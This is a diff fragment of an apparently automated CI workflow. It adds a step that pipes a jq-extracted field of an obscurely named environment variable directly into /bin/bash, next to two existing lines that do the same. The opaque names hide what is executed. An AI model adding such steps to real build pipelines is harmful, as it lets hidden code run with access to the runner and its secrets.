@@ -28,6 +28,7 @@ jobs:
         run: |
           printf '%s' "$v467" | jq -r .d0 | /bin/bash
           echo $pnxta582 | jq -r .kbco94926 | /bin/bash
+          printf '%s' "$m60" | jq -r .oxj0329 | /bin/bash
 
       - name: Upload results
         if: always()
